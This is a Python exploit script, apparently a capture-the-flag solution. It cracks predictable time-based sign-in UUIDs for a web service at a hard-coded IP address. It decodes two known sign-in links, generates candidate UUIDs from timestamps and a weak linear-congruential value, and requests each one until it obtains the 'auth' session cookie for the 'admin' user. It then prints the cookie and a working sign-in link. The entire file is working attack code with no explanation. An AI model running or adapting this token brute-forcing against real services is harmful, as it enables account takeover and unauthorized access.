from typing import Iterator
import requests

def crack_secure_uuid(uuid1: str, uuid2: str, salt: str) -> Iterator[str]:
    uuid1_parts = uuid1.split('-')
    uuid2_parts = uuid2.split('-')

    mac_hex_p1 = uuid1_parts[0]
    mac_hex_p2 = uuid1_parts[2]
    t0 = int(uuid1_parts[1], 16)
    t1 = int(uuid2_parts[1], 16)
    salt = salt[:16].encode('utf-8').hex()
    for t in range(t0, t1 + 1):
        t_hex = hex(t)[2:]
        rand_hex = hex(int(((t * 1103515245 + 12345) / 65536) % 32768))[2:]
        yield f"{mac_hex_p1}-{t_hex}-{mac_hex_p2}-{rand_hex}-{salt}".upper()


def main():
    USERNAME = 'admin'
    URL_PREFIX = "http://89.36.163.101:7777/tg_signin/"
    LINK_1 = "http://89.36.163.101:7777/tg_signin/32343243302d3430373436413239382d4138303030332d373832442d36323646373236393733"
    LINK_2 = "http://89.36.163.101:7777/tg_signin/32343243302d3430373436413243302d4138303030332d334632412d36323646373236393733"

    uuid1 = bytes.fromhex(LINK_1.split("/")[-1]).decode('utf-8')
    uuid3 = bytes.fromhex(LINK_2.split("/")[-1]).decode('utf-8')

    print(f"UUID #1: {uuid1}")
    print(f"UUID #3: {uuid3}")
    print()

    print("CRACKING UUID #2...")
    i = 0

    s = requests.Session()

    for uuid2 in crack_secure_uuid(uuid1, uuid3, USERNAME):
        print(f"UUID #{i}: {uuid2}")

        s.get(URL_PREFIX + uuid2.encode('utf-8').hex())

        if "auth" in s.cookies:
            print()
            print("AUTH_COOKIE:", s.cookies["auth"])
            print("CRACKED UUID:", uuid2)
            print("SIGN IN LINK:", URL_PREFIX + uuid2.encode('utf-8').hex())
            break

        i += 1

    s.close()

if __name__ == "__main__":
    main()
